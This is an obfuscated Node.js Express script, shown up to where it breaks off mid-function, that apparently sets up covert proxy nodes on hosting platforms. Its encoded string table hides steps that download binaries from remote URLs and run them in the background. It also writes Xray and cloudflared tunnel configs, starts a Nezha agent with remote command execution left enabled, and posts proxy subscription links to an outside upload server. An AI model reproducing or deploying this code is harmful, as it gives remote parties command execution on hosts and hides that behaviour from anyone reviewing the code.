const _0x4a07e0=_0x3252;(function(_0x5a37db,_0x542441){const _0x16cc5e={_0x3d4df0:0x1cd,_0x51d4e6:0x1f6},_0x2dee3d=_0x3252,_0x592ba7=_0x5a37db();while(!![]){try{const _0x512ae1=-parseInt(_0x2dee3d(0x16a))/0x1+-parseInt(_0x2dee3d(_0x16cc5e._0x3d4df0))/0x2*(parseInt(_0x2dee3d(0x185))/0x3)+-parseInt(_0x2dee3d(0x157))/0x4+-parseInt(_0x2dee3d(0x166))/0x5+-parseInt(_0x2dee3d(0x203))/0x6+parseInt(_0x2dee3d(0x150))/0x7+parseInt(_0x2dee3d(_0x16cc5e._0x51d4e6))/0x8;if(_0x512ae1===_0x542441)break;else _0x592ba7['push'](_0x592ba7['shift']());}catch(_0x22f14c){_0x592ba7['push'](_0x592ba7['shift']());}}}(_0x2d2e,0x3eba1));const express=require(_0x4a07e0(0x1ec)),app=express(),axios=require(_0x4a07e0(0x1ad)),os=require('os'),fs=require('fs'),path=require(_0x4a07e0(0x183)),{promisify}=require('util'),exec=promisify(require(_0x4a07e0(0x1a8))[_0x4a07e0(0x205)]),{execSync}=require(_0x4a07e0(0x1a8)),UPLOAD_URL=process[_0x4a07e0(0x1da)][_0x4a07e0(0x161)]||'',PROJECT_URL=process[_0x4a07e0(0x1da)][_0x4a07e0(0x1c4)]||'',AUTO_ACCESS=process['env'][_0x4a07e0(0x1e4)]||![],FILE_PATH=process[_0x4a07e0(0x1da)][_0x4a07e0(0x18f)]||'./tmp',SUB_PATH=process['env'][_0x4a07e0(0x1ea)]||_0x4a07e0(0x159),PORT=process['env'][_0x4a07e0(0x1b7)]||process[_0x4a07e0(0x1da)]['PORT']||0xbb8,UUID=process[_0x4a07e0(0x1da)]['UUID']||_0x4a07e0(0x1c6),NEZHA_SERVER=process[_0x4a07e0(0x1da)][_0x4a07e0(0x1fd)]||'',NEZHA_PORT=process[_0x4a07e0(0x1da)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4a07e0(0x1da)][_0x4a07e0(0x1f8)]||'',ARGO_DOMAIN=process[_0x4a07e0(0x1da)][_0x4a07e0(0x17a)]||_0x4a07e0(0x1db),ARGO_AUTH=process[_0x4a07e0(0x1da)][_0x4a07e0(0x196)]||_0x4a07e0(0x1a4),ARGO_PORT=process[_0x4a07e0(0x1da)][_0x4a07e0(0x193)]||0x1f41,CFIP=process[_0x4a07e0(0x1da)][_0x4a07e0(0x1dc)]||'cdns.doon.eu.org',CFPORT=process[_0x4a07e0(0x1da)][_0x4a07e0(0x154)]||0x1bb,NAME=process[_0x4a07e0(0x1da)]['NAME']||'Railway';!fs[_0x4a07e0(0x164)](FILE_PATH)?(fs[_0x4a07e0(0x1bf)](FILE_PATH),console['log'](FILE_PATH+_0x4a07e0(0x15f))):console[_0x4a07e0(0x208)](FILE_PATH+_0x4a07e0(0x181));function generateRandomName(){const _0x2f6520={_0x1d559a:0x1c9},_0x3bf1b0=_0x4a07e0,_0x336099='abcdefghijklmnopqrstuvwxyz';let _0x530da9='';for(let _0x2bae78=0x0;_0x2bae78<0x6;_0x2bae78++){_0x530da9+=_0x336099[_0x3bf1b0(0x172)](Math[_0x3bf1b0(_0x2f6520._0x1d559a)](Math['random']()*_0x336099['length']));}return _0x530da9;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4a07e0(0x182)](FILE_PATH,npmName),phpPath=path[_0x4a07e0(0x182)](FILE_PATH,phpName),webPath=path[_0x4a07e0(0x182)](FILE_PATH,webName),botPath=path[_0x4a07e0(0x182)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4a07e0(0x170)),listPath=path['join'](FILE_PATH,_0x4a07e0(0x1b4)),bootLogPath=path[_0x4a07e0(0x182)](FILE_PATH,'boot.log'),configPath=path[_0x4a07e0(0x182)](FILE_PATH,_0x4a07e0(0x16e));function deleteNodes(){const _0x37ff0b={_0x1a5e01:0x164,_0x120182:0x1fa,_0x2e2259:0x1df,_0x286f45:0x1aa,_0x54f338:0x156,_0x2353dd:0x1cc,_0x51bee1:0x19b,_0x246c13:0x1ef},_0x37a2b4=_0x4a07e0;try{if(!UPLOAD_URL)return;if(!fs[_0x37a2b4(_0x37ff0b._0x1a5e01)](subPath))return;let _0x4a72e4;try{_0x4a72e4=fs[_0x37a2b4(_0x37ff0b._0x120182)](subPath,'utf-8');}catch{return null;}const _0x4f3bf0=Buffer[_0x37a2b4(0x1a3)](_0x4a72e4,_0x37a2b4(_0x37ff0b._0x2e2259))['toString'](_0x37a2b4(_0x37ff0b._0x286f45)),_0x3cf238=_0x4f3bf0[_0x37a2b4(_0x37ff0b._0x54f338)]('\x0a')[_0x37a2b4(_0x37ff0b._0x2353dd)](_0xb94d11=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xb94d11));if(_0x3cf238[_0x37a2b4(0x1eb)]===0x0)return;return axios[_0x37a2b4(_0x37ff0b._0x51bee1)](UPLOAD_URL+_0x37a2b4(_0x37ff0b._0x246c13),JSON[_0x37a2b4(0x165)]({'nodes':_0x3cf238}),{'headers':{'Content-Type':_0x37a2b4(0x16d)}})['catch'](_0x1e3b98=>{return null;}),null;}catch(_0x36fbdd){return null;}}function cleanupOldFiles(){const _0x3c4b88={_0x354cae:0x182,_0x54a130:0x1d2,_0x4c7a34:0x160},_0x55cb5d=_0x4a07e0;try{const _0x4b7d26=fs['readdirSync'](FILE_PATH);_0x4b7d26[_0x55cb5d(0x209)](_0x353ada=>{const _0x46c82c=_0x55cb5d,_0xba6fd6=path[_0x46c82c(_0x3c4b88._0x354cae)](FILE_PATH,_0x353ada);try{const _0x40c3cd=fs[_0x46c82c(0x173)](_0xba6fd6);_0x40c3cd[_0x46c82c(_0x3c4b88._0x54a130)]()&&fs[_0x46c82c(_0x3c4b88._0x4c7a34)](_0xba6fd6);}catch(_0x3de33e){}});}catch(_0x2ca26d){}}app[_0x4a07e0(0x158)]('/',function(_0x4449be,_0x4f35f6){const _0x1966ea={_0x2fab9d:0x201},_0x13520b=_0x4a07e0;_0x4f35f6[_0x13520b(0x152)](_0x13520b(_0x1966ea._0x2fab9d));});async function generateConfig(){const _0x3903e1={_0x1ea8e1:0x17d,_0x1aacf8:0x17b,_0x38c060:0x1d6,_0xfda640:0x192,_0x3fa4e0:0x1d6,_0xaf8ba3:0x192,_0xe1229b:0x176,_0x49ddea:0x1e5,_0x31d23e:0x1e8,_0x222dd3:0x1e8,_0x115c21:0x178,_0x59a078:0x14c,_0x25b795:0x1f9,_0x4c5115:0x1fc,_0x1c41a9:0x182},_0x29d04b=_0x4a07e0,_0x4e9d44={'log':{'access':_0x29d04b(0x17d),'error':_0x29d04b(_0x3903e1._0x1ea8e1),'loglevel':_0x29d04b(0x176)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x29d04b(_0x3903e1._0x1aacf8),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x29d04b(0x176),'fallbacks':[{'dest':0xbb9},{'path':_0x29d04b(0x1e5),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x29d04b(_0x3903e1._0x38c060)}},{'port':0xbb9,'listen':_0x29d04b(_0x3903e1._0xfda640),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x29d04b(0x176)},'streamSettings':{'network':_0x29d04b(_0x3903e1._0x3fa4e0),'security':_0x29d04b(0x176)}},{'port':0xbba,'listen':_0x29d04b(_0x3903e1._0xaf8ba3),'protocol':_0x29d04b(0x17b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x29d04b(_0x3903e1._0xe1229b)},'streamSettings':{'network':'ws','security':_0x29d04b(0x176),'wsSettings':{'path':_0x29d04b(_0x3903e1._0x49ddea)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x29d04b(0x200),_0x29d04b(_0x3903e1._0x31d23e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x29d04b(0x192),'protocol':_0x29d04b(0x1b5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x29d04b(0x1d8)}},'sniffing':{'enabled':!![],'destOverride':[_0x29d04b(0x14c),'tls',_0x29d04b(_0x3903e1._0x222dd3)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x29d04b(0x192),'protocol':_0x29d04b(0x15a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x29d04b(0x176),'wsSettings':{'path':_0x29d04b(_0x3903e1._0x115c21)}},'sniffing':{'enabled':!![],'destOverride':[_0x29d04b(_0x3903e1._0x59a078),'tls',_0x29d04b(_0x3903e1._0x31d23e)],'metadataOnly':![]}}],'dns':{'servers':[_0x29d04b(_0x3903e1._0x25b795)]},'outbounds':[{'protocol':'freedom','tag':_0x29d04b(_0x3903e1._0x4c5115)},{'protocol':'blackhole','tag':_0x29d04b(0x1a7)}]};fs[_0x29d04b(0x1a0)](path[_0x29d04b(_0x3903e1._0x1c41a9)](FILE_PATH,_0x29d04b(0x16e)),JSON[_0x29d04b(0x165)](_0x4e9d44,null,0x2));}function getSystemArchitecture(){const _0x180dbf={_0x4aaba5:0x1bd,_0x125c7b:0x1b8,_0x1a681e:0x1f5},_0xeecc07=_0x4a07e0,_0x39e267=os[_0xeecc07(_0x180dbf._0x4aaba5)]();return _0x39e267===_0xeecc07(0x1e9)||_0x39e267==='arm64'||_0x39e267===_0xeecc07(_0x180dbf._0x125c7b)?'arm':_0xeecc07(_0x180dbf._0x1a681e);}function downloadFile(_0x5af30,_0x428f3b,_0x59d2f7){const _0x2265bc={_0x367b93:0x206,_0x2cba41:0x171},_0x1f3d1b={_0x19e38b:0x1b1},_0x393b97=_0x4a07e0,_0x47cb52=_0x5af30;!fs[_0x393b97(0x164)](FILE_PATH)&&fs[_0x393b97(0x1bf)](FILE_PATH,{'recursive':!![]});const _0x590d46=fs['createWriteStream'](_0x47cb52);axios({'method':_0x393b97(0x158),'url':_0x428f3b,'responseType':_0x393b97(0x19e)})[_0x393b97(0x19d)](_0x34419b=>{const _0xd6acc8={_0x492ec1:0x1e0,_0x1e714d:0x1b2,_0x518f40:0x1f1},_0x5aca73=_0x393b97;_0x34419b[_0x5aca73(_0x2265bc._0x367b93)][_0x5aca73(0x1cf)](_0x590d46),_0x590d46['on'](_0x5aca73(0x1f2),()=>{const _0xa3a726=_0x5aca73;_0x590d46[_0xa3a726(0x1a2)](),console['log'](_0xa3a726(_0x1f3d1b._0x19e38b)+path[_0xa3a726(0x1b2)](_0x47cb52)+'\x20successfully'),_0x59d2f7(null,_0x47cb52);}),_0x590d46['on'](_0x5aca73(_0x2265bc._0x2cba41),_0x5a05cb=>{const _0x5c6bb2=_0x5aca73;fs[_0x5c6bb2(_0xd6acc8._0x492ec1)](_0x47cb52,()=>{});const _0x3eaf37='Download\x20'+path[_0x5c6bb2(_0xd6acc8._0x1e714d)](_0x47cb52)+_0x5c6bb2(0x155)+_0x5a05cb[_0x5c6bb2(_0xd6acc8._0x518f40)];console['error'](_0x3eaf37),_0x59d2f7(_0x3eaf37);});})[_0x393b97(0x15b)](_0x569124=>{const _0x2a9a1b=_0x393b97,_0x1579e7=_0x2a9a1b(0x1b1)+path['basename'](_0x47cb52)+'\x20failed:\x20'+_0x569124[_0x2a9a1b(0x1f1)];console[_0x2a9a1b(0x171)](_0x1579e7),_0x59d2f7(_0x1579e7);});}async function downloadFilesAndRun(){const _0x3dfc8c={_0x41adf8:0x208,_0x540e35:0x1c0,_0x10c88c:0x1d5,_0x64a5aa:0x191,_0x362758:0x16f,_0x5ae04e:0x1dd,_0x1465e8:0x1a0,_0x44ba5f:0x15e,_0x5890a7:0x1a6,_0xc2b4f:0x208,_0xeedf7e:0x1be,_0x231fad:0x171,_0x294eeb:0x1d9,_0x101b36:0x1b3,_0x8aaabb:0x1f3,_0x247dce:0x1b0,_0x50e205:0x15e,_0xca3110:0x1e3,_0x5b4788:0x1c7,_0x376a6a:0x15e,_0x4076ea:0x1fe,_0x61c828:0x208,_0x41ea75:0x204,_0xf07589:0x202,_0x16026f:0x1cb},_0x4f934d=_0x4a07e0,_0x1fa681=getSystemArchitecture(),_0x526dfc=getFilesForArchitecture(_0x1fa681);if(_0x526dfc[_0x4f934d(0x1eb)]===0x0){console[_0x4f934d(_0x3dfc8c._0x41adf8)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x47b0e3=_0x526dfc[_0x4f934d(_0x3dfc8c._0x540e35)](_0x36bbc7=>{return new Promise((_0x78ed17,_0x28e0ab)=>{const _0x4c3a6b=_0x3252;downloadFile(_0x36bbc7[_0x4c3a6b(0x1ff)],_0x36bbc7['fileUrl'],(_0x2239ad,_0x1872bc)=>{_0x2239ad?_0x28e0ab(_0x2239ad):_0x78ed17(_0x1872bc);});});});try{await Promise[_0x4f934d(_0x3dfc8c._0x10c88c)](_0x47b0e3);}catch(_0x58fcdb){console[_0x4f934d(0x171)]('Error\x20downloading\x20files:',_0x58fcdb);return;}function _0x4c788d(_0x2cd811){const _0x40d0f8={_0x26179a:0x162},_0x535610=_0x4f934d,_0xf29ee8=0x1fd;_0x2cd811[_0x535610(0x209)](_0x58d6ab=>{const _0x44fc3c={_0x18c520:0x208},_0x5f2d75=_0x535610;fs[_0x5f2d75(0x164)](_0x58d6ab)&&fs[_0x5f2d75(_0x40d0f8._0x26179a)](_0x58d6ab,_0xf29ee8,_0xdd9202=>{const _0x462c68=_0x5f2d75;_0xdd9202?console[_0x462c68(0x171)](_0x462c68(0x1bc)+_0x58d6ab+':\x20'+_0xdd9202):console[_0x462c68(_0x44fc3c._0x18c520)]('Empowerment\x20success\x20for\x20'+_0x58d6ab+':\x20'+_0xf29ee8[_0x462c68(0x1ce)](0x8));});});}const _0x1ea40b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c788d(_0x1ea40b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x324dd5=NEZHA_SERVER[_0x4f934d(0x14d)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0xd4c7cc=new Set([_0x4f934d(0x18d),_0x4f934d(0x1e6),_0x4f934d(0x1b3),_0x4f934d(_0x3dfc8c._0x64a5aa),_0x4f934d(_0x3dfc8c._0x362758),_0x4f934d(0x1f3)]),_0x4753f7=_0xd4c7cc['has'](_0x324dd5)?'true':'false',_0x405ce2=_0x4f934d(0x15c)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4f934d(0x1ee)+_0x4753f7+_0x4f934d(_0x3dfc8c._0x5ae04e)+UUID;fs[_0x4f934d(_0x3dfc8c._0x1465e8)](path['join'](FILE_PATH,_0x4f934d(0x1ca)),_0x405ce2);const _0xde3d7b=_0x4f934d(_0x3dfc8c._0x44ba5f)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x4f934d(_0x3dfc8c._0x5890a7);try{await exec(_0xde3d7b),console[_0x4f934d(_0x3dfc8c._0xc2b4f)](phpName+_0x4f934d(_0x3dfc8c._0xeedf7e)),await new Promise(_0x134d22=>setTimeout(_0x134d22,0x3e8));}catch(_0x17920f){console[_0x4f934d(_0x3dfc8c._0x231fad)](_0x4f934d(_0x3dfc8c._0x294eeb)+_0x17920f);}}else{let _0x24e1c6='';const _0x49a956=[_0x4f934d(0x18d),'8443',_0x4f934d(_0x3dfc8c._0x101b36),_0x4f934d(0x191),_0x4f934d(0x16f),_0x4f934d(_0x3dfc8c._0x8aaabb)];_0x49a956[_0x4f934d(0x14d)](NEZHA_PORT)&&(_0x24e1c6=_0x4f934d(_0x3dfc8c._0x247dce));const _0x373f85=_0x4f934d(_0x3dfc8c._0x50e205)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4f934d(0x1bb)+NEZHA_KEY+'\x20'+_0x24e1c6+_0x4f934d(_0x3dfc8c._0xca3110);try{await exec(_0x373f85),console[_0x4f934d(0x208)](npmName+'\x20is\x20running'),await new Promise(_0x3d0a43=>setTimeout(_0x3d0a43,0x3e8));}catch(_0x406fec){console[_0x4f934d(0x171)](_0x4f934d(_0x3dfc8c._0x5b4788)+_0x406fec);}}}else console[_0x4f934d(0x208)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x31e820=_0x4f934d(_0x3dfc8c._0x376a6a)+webPath+_0x4f934d(_0x3dfc8c._0x4076ea)+FILE_PATH+_0x4f934d(0x1c5);try{await exec(_0x31e820),console[_0x4f934d(_0x3dfc8c._0x61c828)](webName+_0x4f934d(_0x3dfc8c._0xeedf7e)),await new Promise(_0x14e07d=>setTimeout(_0x14e07d,0x3e8));}catch(_0x25eee1){console[_0x4f934d(0x171)](_0x4f934d(_0x3dfc8c._0x41ea75)+_0x25eee1);}if(fs['existsSync'](botPath)){let _0x32aa6b;if(ARGO_AUTH[_0x4f934d(_0x3dfc8c._0xf07589)](/^[A-Z0-9a-z=]{120,250}$/))_0x32aa6b=_0x4f934d(0x16b)+ARGO_AUTH;else ARGO_AUTH[_0x4f934d(0x202)](/TunnelSecret/)?_0x32aa6b=_0x4f934d(0x175)+FILE_PATH+_0x4f934d(_0x3dfc8c._0x16026f):_0x32aa6b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4f934d(0x15e)+botPath+'\x20'+_0x32aa6b+_0x4f934d(0x19a)),console[_0x4f934d(0x208)](botName+_0x4f934d(0x1be)),await new Promise(_0x1634df=>setTimeout(_0x1634df,0x7d0));}catch(_0x345017){console[_0x4f934d(0x171)](_0x4f934d(0x151)+_0x345017);}}await new Promise(_0x11df95=>setTimeout(_0x11df95,0x1388));}function getFilesForArchitecture(_0x28bdf9){const _0x354ec2={_0x57cdbc:0x153,_0x5677cd:0x1b9,_0x106334:0x186,_0x40b055:0x1e9,_0x131a5a:0x177,_0x86c0a2:0x14e},_0x386542=_0x4a07e0;let _0x234019;_0x28bdf9==='arm'?_0x234019=[{'fileName':webPath,'fileUrl':_0x386542(_0x354ec2._0x57cdbc)},{'fileName':botPath,'fileUrl':_0x386542(0x188)}]:_0x234019=[{'fileName':webPath,'fileUrl':_0x386542(_0x354ec2._0x5677cd)},{'fileName':botPath,'fileUrl':_0x386542(0x1a5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xb30ea5=_0x28bdf9===_0x386542(0x1e9)?_0x386542(_0x354ec2._0x106334):_0x386542(0x1af);_0x234019[_0x386542(0x14e)]({'fileName':npmPath,'fileUrl':_0xb30ea5});}else{const _0x34c426=_0x28bdf9===_0x386542(_0x354ec2._0x40b055)?_0x386542(0x1c8):_0x386542(_0x354ec2._0x131a5a);_0x234019[_0x386542(_0x354ec2._0x86c0a2)]({'fileName':phpPath,'fileUrl':_0x34c426});}}return _0x234019;}function argoType(){const _0x580191={_0x48c186:0x17f,_0x8c5c28:0x182,_0xe8ff84:0x199,_0x358c43:0x180,_0x2b7be0:0x182,_0x3643af:0x1d7},_0x54d99f=_0x4a07e0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x54d99f(0x208)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x54d99f(_0x580191._0x48c186))){fs[_0x54d99f(0x1a0)](path[_0x54d99f(_0x580191._0x8c5c28)](FILE_PATH,_0x54d99f(0x1d0)),ARGO_AUTH);const _0x11c095=_0x54d99f(0x1d4)+ARGO_AUTH[_0x54d99f(0x156)]('\x22')[0xb]+_0x54d99f(_0x580191._0xe8ff84)+path[_0x54d99f(_0x580191._0x8c5c28)](FILE_PATH,_0x54d99f(0x1d0))+_0x54d99f(0x194)+ARGO_DOMAIN+_0x54d99f(_0x580191._0x358c43)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x54d99f(_0x580191._0x2b7be0)](FILE_PATH,_0x54d99f(0x1ac)),_0x11c095);}else console['log'](_0x54d99f(_0x580191._0x3643af));}async function extractDomains(){const _0x28c965={_0x170558:0x184,_0x3959fe:0x182,_0x5b7cff:0x1eb,_0x47edc8:0x208,_0x5bf00e:0x14b,_0xff4eb7:0x160,_0x376aeb:0x16c,_0x54c168:0x19a},_0x3ef3c3={_0x15c2b8:0x158,_0x474083:0x206,_0x58b02c:0x17c,_0x13a419:0x190,_0x262da3:0x206,_0x2d0443:0x18a,_0x5b31d4:0x206,_0xaabb33:0x1f4},_0x23730d={_0xf5ead1:0x18c,_0x4d5ee4:0x1c2},_0x55e4a8={_0x5896b2:0x202},_0x1ceab1=_0x4a07e0;let _0xc8d1f4;if(ARGO_AUTH&&ARGO_DOMAIN)_0xc8d1f4=ARGO_DOMAIN,console['log'](_0x1ceab1(_0x28c965._0x170558),_0xc8d1f4),await _0x2be2b4(_0xc8d1f4);else try{const _0x469725=fs['readFileSync'](path[_0x1ceab1(_0x28c965._0x3959fe)](FILE_PATH,_0x1ceab1(0x1f7)),'utf-8'),_0x420bc8=_0x469725['split']('\x0a'),_0x397357=[];_0x420bc8['forEach'](_0x149cb0=>{const _0x489919=_0x1ceab1,_0x10cee1=_0x149cb0[_0x489919(_0x55e4a8._0x5896b2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x10cee1){const _0x439770=_0x10cee1[0x1];_0x397357['push'](_0x439770);}});if(_0x397357[_0x1ceab1(_0x28c965._0x5b7cff)]>0x0)_0xc8d1f4=_0x397357[0x0],console[_0x1ceab1(_0x28c965._0x47edc8)](_0x1ceab1(_0x28c965._0x5bf00e),_0xc8d1f4),await _0x2be2b4(_0xc8d1f4);else{console[_0x1ceab1(_0x28c965._0x47edc8)](_0x1ceab1(0x19f)),fs[_0x1ceab1(_0x28c965._0xff4eb7)](path[_0x1ceab1(0x182)](FILE_PATH,_0x1ceab1(0x1f7)));async function _0x5a9e7c(){const _0x174aa8=_0x1ceab1;try{process[_0x174aa8(_0x23730d._0xf5ead1)]==='win32'?await exec(_0x174aa8(_0x23730d._0x4d5ee4)+botName+_0x174aa8(0x1b6)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x174aa8(0x169));}catch(_0xfe0c9){}}_0x5a9e7c(),await new Promise(_0x3b2166=>setTimeout(_0x3b2166,0xbb8));const _0x28c751=_0x1ceab1(0x168)+FILE_PATH+_0x1ceab1(_0x28c965._0x376aeb)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x28c751+_0x1ceab1(_0x28c965._0x54c168)),console[_0x1ceab1(0x208)](botName+_0x1ceab1(0x1be)),await new Promise(_0x594c56=>setTimeout(_0x594c56,0xbb8)),await extractDomains();}catch(_0x3a1012){console['error'](_0x1ceab1(0x151)+_0x3a1012);}}}catch(_0x2f9ccf){console['error']('Error\x20reading\x20boot.log:',_0x2f9ccf);}async function _0x4ce7ca(){const _0x2277a9=_0x1ceab1;try{const _0x5bf76c=await axios[_0x2277a9(_0x3ef3c3._0x15c2b8)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x5bf76c[_0x2277a9(0x206)]&&_0x5bf76c[_0x2277a9(_0x3ef3c3._0x474083)][_0x2277a9(0x190)]&&_0x5bf76c['data'][_0x2277a9(_0x3ef3c3._0x58b02c)])return _0x5bf76c[_0x2277a9(0x206)][_0x2277a9(_0x3ef3c3._0x13a419)]+'_'+_0x5bf76c[_0x2277a9(_0x3ef3c3._0x474083)][_0x2277a9(0x17c)];}catch(_0x2135f9){try{const _0x152ed8=await axios['get'](_0x2277a9(0x189),{'timeout':0xbb8});if(_0x152ed8[_0x2277a9(_0x3ef3c3._0x262da3)]&&_0x152ed8[_0x2277a9(_0x3ef3c3._0x474083)]['status']===_0x2277a9(_0x3ef3c3._0x2d0443)&&_0x152ed8[_0x2277a9(0x206)]['countryCode']&&_0x152ed8[_0x2277a9(_0x3ef3c3._0x5b31d4)][_0x2277a9(0x17c)])return _0x152ed8[_0x2277a9(0x206)][_0x2277a9(_0x3ef3c3._0xaabb33)]+'_'+_0x152ed8[_0x2277a9(_0x3ef3c3._0x262da3)]['org'];}catch(_0x4bad2c){}}return'Unknown';}async function _0x2be2b4(_0x1abcb6){const _0x5f4f4f=await _0x4ce7ca(),_0x174915=NAME?NAME+'-'+_0x5f4f4f:_0x5f4f4f;return new Promise(_0x2860b4=>{const _0x151e8e={_0x5f29db:0x163,_0x42643f:0x19c,_0x461328:0x187,_0x38ec08:0x1df,_0xf236e1:0x18e,_0x1c5cd8:0x1a3,_0x19e15b:0x158},_0x4e11db={_0x5a11d7:0x20a,_0x427bea:0x179};setTimeout(()=>{const _0xd7cb5e=_0x3252,_0xcd6482={'v':'2','ps':''+_0x174915,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xd7cb5e(0x176),'net':'ws','type':_0xd7cb5e(0x176),'host':_0x1abcb6,'path':_0xd7cb5e(0x1d3),'tls':'tls','sni':_0x1abcb6,'alpn':'','fp':_0xd7cb5e(0x1fb)},_0x2d1b09=_0xd7cb5e(_0x151e8e._0x5f29db)+UUID+'@'+CFIP+':'+CFPORT+_0xd7cb5e(_0x151e8e._0x42643f)+_0x1abcb6+'&fp=firefox&type=ws&host='+_0x1abcb6+_0xd7cb5e(0x1e1)+_0x174915+_0xd7cb5e(_0x151e8e._0x461328)+Buffer['from'](JSON[_0xd7cb5e(0x165)](_0xcd6482))[_0xd7cb5e(0x1ce)](_0xd7cb5e(_0x151e8e._0x38ec08))+_0xd7cb5e(_0x151e8e._0xf236e1)+UUID+'@'+CFIP+':'+CFPORT+_0xd7cb5e(0x195)+_0x1abcb6+_0xd7cb5e(0x1e2)+_0x1abcb6+_0xd7cb5e(0x18b)+_0x174915+_0xd7cb5e(0x1ed);console[_0xd7cb5e(0x208)](Buffer[_0xd7cb5e(0x1a3)](_0x2d1b09)[_0xd7cb5e(0x1ce)]('base64')),fs[_0xd7cb5e(0x1a0)](subPath,Buffer[_0xd7cb5e(_0x151e8e._0x1c5cd8)](_0x2d1b09)['toString'](_0xd7cb5e(0x1df))),console[_0xd7cb5e(0x208)](FILE_PATH+_0xd7cb5e(0x1a9)),uploadNodes(),app[_0xd7cb5e(_0x151e8e._0x19e15b)]('/'+SUB_PATH,(_0x35dd45,_0x378700)=>{const _0x915fd3=_0xd7cb5e,_0x18d5bb=Buffer[_0x915fd3(0x1a3)](_0x2d1b09)[_0x915fd3(0x1ce)](_0x915fd3(0x1df));_0x378700[_0x915fd3(_0x4e11db._0x5a11d7)]('Content-Type',_0x915fd3(_0x4e11db._0x427bea)),_0x378700[_0x915fd3(0x152)](_0x18d5bb);}),_0x2860b4(_0x2d1b09);},0x7d0);});}}async function uploadNodes(){const _0x3ead4c={_0x529b3b:0x19b,_0x199176:0x16d,_0x247cfb:0x208,_0x2b3b98:0x1ae,_0x58ac9d:0x164,_0x899cd7:0x1fa,_0x4a5476:0x1cc,_0x560a9c:0x19b,_0xa0b504:0x1ba,_0x4de6de:0x208},_0x2bed4a=_0x4a07e0;if(UPLOAD_URL&&PROJECT_URL){const _0x8dc27b=PROJECT_URL+'/'+SUB_PATH,_0x47f6d3={'subscription':[_0x8dc27b]};try{const _0x1fe8ed=await axios[_0x2bed4a(_0x3ead4c._0x529b3b)](UPLOAD_URL+_0x2bed4a(0x1c3),_0x47f6d3,{'headers':{'Content-Type':_0x2bed4a(_0x3ead4c._0x199176)}});return _0x1fe8ed&&_0x1fe8ed[_0x2bed4a(0x1a1)]===0xc8?(console[_0x2bed4a(_0x3ead4c._0x247cfb)](_0x2bed4a(0x1d1)),_0x1fe8ed):null;}catch(_0x47ca25){if(_0x47ca25['response']){if(_0x47ca25[_0x2bed4a(_0x3ead4c._0x2b3b98)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2bed4a(_0x3ead4c._0x58ac9d)](listPath))return;const _0x2d38af=fs[_0x2bed4a(_0x3ead4c._0x899cd7)](listPath,_0x2bed4a(0x1aa)),_0xeaa71f=_0x2d38af['split']('\x0a')[_0x2bed4a(_0x3ead4c._0x4a5476)](_0x344d20=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2bed4a(0x20b)](_0x344d20));if(_0xeaa71f[_0x2bed4a(0x1eb)]===0x0)return;const _0x1aa8f6=JSON[_0x2bed4a(0x165)]({'nodes':_0xeaa71f});try{const _0x4dba05=await axios[_0x2bed4a(_0x3ead4c._0x560a9c)](UPLOAD_URL+_0x2bed4a(_0x3ead4c._0xa0b504),_0x1aa8f6,{'headers':{'Content-Type':_0x2bed4a(_0x3ead4c._0x199176)}});return _0x4dba05&&_0x4dba05['status']===0xc8?(console[_0x2bed4a(_0x3ead4c._0x4de6de)](_0x2bed4a(0x1de)),_0x4dba05):null;}catch(_0x14b9a5){return null;}}else return;}}function _0x3252(_0x4d7840,_0x2e22a9){const _0x2d2ee0=_0x2d2e();return 